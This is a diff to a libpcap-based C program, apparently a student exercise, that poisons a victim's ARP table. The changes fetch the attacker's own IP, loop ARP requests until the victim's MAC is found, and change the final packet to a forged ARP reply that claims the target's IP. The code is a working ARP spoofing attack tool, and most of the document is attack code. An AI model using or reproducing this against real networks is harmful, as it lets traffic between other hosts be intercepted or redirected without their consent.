@@ -1,11 +1,10 @@
 /*
  * Author : Jinkyoung Kim
+ * Contact : kjkjk1178@gmail.com
  *
  * This program changes victim's arp table
  * 
- * contact : kjkjk1178@gmail.com
  */
-
 
 #include <pcap.h>
 #include <stdio.h>
@@ -47,7 +46,7 @@ typedef struct myArphdr
 
 //--- Function declaration ---
 
-void GetMyMAC(uint8_t * , uint8_t * );
+void GetMyAddr(uint8_t * , uint8_t * , uint32_t * );
 bool GetVictimMAC(uint8_t * , uint8_t * , uint8_t * , uint32_t );
 bool IsARPNext(uint16_t );
 bool IsVictim(uint32_t , uint32_t );
@@ -68,6 +67,7 @@ int main(int argc, char * argv[])
     uint8_t victimMAC[ETH_ALEN];
     uint32_t victimIP;
     uint32_t targetIP;
+    uint32_t myIP;
 
     if(argc !=4)
     {
@@ -91,30 +91,41 @@ int main(int argc, char * argv[])
     targetIP = inet_addr(argv[3]);
 
 
-
-    GetMyMAC((uint8_t *)argv[1], myMAC);
+    GetMyAddr((uint8_t *)argv[1], myMAC, &myIP);
 
 
     //--- get victim's MAC ---
-
-    MakeARP(ARPOP_REQUEST,buf, NULL, myMAC, victimIP, targetIP);
-    pcap_sendpacket(handle, (const u_char *)buf, 0x2a);
+    
+    //-------------------------------------------------------내 IP로 수정
+    MakeARP(ARPOP_REQUEST,buf, NULL, myMAC, victimIP, myIP);
+   
     
     //get response
     bool getResponse = false;
     while (!getResponse) 
     {
-        struct pcap_pkthdr * header;
-        const uint8_t * packet;
+        printf("trying to get victime's MAC..\n");
 
-        int res = pcap_next_ex(handle, &header, &packet);
-        if (res == 0) continue;
-        if (res == -1 || res == -2) break;
+        pcap_sendpacket(handle, (const u_char *)buf, 0x2a);
         
-        //ARP 응답인지 체크
-        getResponse = GetVictimMAC((uint8_t *)packet, myMAC, victimMAC, victimIP);
-        
+        for(int i =0; i< 100; i++)
+        {
+            struct pcap_pkthdr * header;
+            const uint8_t * packet;
+
+            int res = pcap_next_ex(handle, &header, &packet);
+            if (res == 0) continue;
+            if (res == -1 || res == -2) break;
+            
+            //ARP 응답인지 체크
+            getResponse = GetVictimMAC((uint8_t *)packet, myMAC, victimMAC, victimIP);
+            
+            if(getResponse == true)
+                break;
+        }
     }
+
+    printf("success to get victime's MAC!\n");
 
     //___ get victim's MAC ___
 
@@ -122,7 +133,9 @@ int main(int argc, char * argv[])
 
     memset(buf, 0, sizeof(buf));
 
-    MakeARP(ARPOP_REQUEST, buf, victimMAC, myMAC, victimIP, targetIP);
+    MakeARP(ARPOP_REPLY, buf, victimMAC, myMAC, victimIP, targetIP);
+
+    printf("do ARP spoofing...\n");
     pcap_sendpacket(handle, (const u_char *)buf, 0x2a);
 
     //___ ARP spoofing ___
@@ -131,7 +144,7 @@ int main(int argc, char * argv[])
 
 
 
-void GetMyMAC(uint8_t * interface, uint8_t * myMAC)
+void GetMyAddr(uint8_t * interface, uint8_t * myMAC, uint32_t * myIP)
 {
     struct ifreq s;
     int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
@@ -146,6 +159,22 @@ void GetMyMAC(uint8_t * interface, uint8_t * myMAC)
         printf("Fail to get my MAC address!\n");
         exit(1);
     }
+
+    s.ifr_addr.sa_family = AF_INET;
+
+    if (0 == ioctl(fd, SIOCGIFADDR, &s))
+    {
+        * myIP = (uint32_t)(((struct sockaddr_in *)&s.ifr_addr)->sin_addr.s_addr);
+
+    }
+    else
+    {
+        printf("Fail to get my IP address!\n");
+        exit(1);
+
+    }
+
+    close(fd);
 
 } //void GetMyMAC(uint8_t * interface, uint8_t * myMAC)
 
